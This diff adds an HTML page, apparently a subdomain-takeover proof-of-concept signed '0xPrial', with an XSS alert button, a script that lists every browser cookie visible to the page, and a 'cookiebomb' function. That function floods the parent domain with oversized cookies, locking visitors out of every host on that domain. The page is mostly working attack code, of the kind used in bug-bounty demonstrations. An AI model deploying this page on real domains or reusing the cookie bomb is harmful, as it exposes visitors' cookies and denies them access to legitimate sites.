@@ -1,0 +1,82 @@
+<html>
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	<title>..:: Takeovered By 0xPrial ::..</title>
+	<style id="visited-7e-style" type="text/css">
+		a:visited, a:visited * { color: #FF0000 !important; }
+		fieldset {
+		  background-color: #d2daff;
+		}
+		
+		legend {
+		  background-color: black;
+		  color: white;
+		  padding: 4px 10px;
+		}
+	</style>
+</head>
+<body style="text-shadow:0px 0px 7px blue; bg-color:#000000">
+	<br><br>
+	<h1>
+<center>
+    <font style="text-shadow: 0px 0px 6px rgb(255, 0, 0), 0px 0px 5px rgb(255, 0, 0), 0px 0px 5px rgb(255, 0, 0); color: rgb(255, 255, 255); font-weight: bold; font-size:50px;">..:: Takeovered By 0xPrial ::..</font>
+</center></h1>
+	<br>
+	<center>
+		<button onclick=prompt(document.domain)>Click here for XSS Alert</button>
+		<button onclick=cookiebomb()>Click here to cookie bomb main domain</button>
+	</center>
+	<br>
+	<script>
+		function get_cookies_array() {
+		
+		    var cookies = { };
+		
+		    if (document.cookie && document.cookie != '') {
+		        var split = document.cookie.split(';');
+		        for (var i = 0; i < split.length; i++) {
+		            var name_value = split[i].split("=");
+		            name_value[0] = name_value[0].replace(/^ /, '');
+		            cookies[decodeURIComponent(name_value[0])] = decodeURIComponent(name_value[1]);
+		        }
+		    }
+		
+		    return cookies;
+		
+		}
+	</script>
+	<fieldset>
+		<legend><font size="5">Browser Cookies</font>
+		</legend>
+		<script>
+			var cookies = get_cookies_array();
+			for(var name in cookies) {
+			  document.write( "<b><ul><li>" + name + " </b>=> <font color='red'><code>" + cookies[name] + "<br /></code></font></ul></li>" );
+			}
+		</script>
+	</fieldset>
+	<script>
+		function cookiebomb(){
+			d = document.domain.split(".").splice(-2).join(".");
+			var pollution = Array(4000).join('a');
+			for(var i=1;i<99;i++){
+				document.cookie='bomb'+i+'='+pollution+';Domain='+d;
+			}
+			setTimeout(()=>{alert("Cookie bomb complete! You can no longer access any host on "+d+" in your browser.")}, 1000);
+		}
+	</script>
+	<br>
+	<center>
+		<br>
+		<a href="https://twitter.com/0xPrial" target="_blank">
+			<img src="https://img.shields.io/twitter/follow/0xPrial?label=Twitter&color=00acee&logo=twitter&style=for-the-badge" />
+		</a>
+		<a href="https://github.com/0xPrial" target="_blank">
+			<img src="https://img.shields.io/github/followers/0xPrial?label=GitHub&logo=GitHub&style=for-the-badge" alt="GitHub badge" />
+		</a>
+		<a href="https://facebook.com/0xPrial" target="_blank">
+			<img src="https://img.shields.io/badge/Facebook-Connect-brightgreen?style=for-the-badge&logo=facebook" alt="Facebook" />
+		</a>
+	</center>
+</body>
+</html>
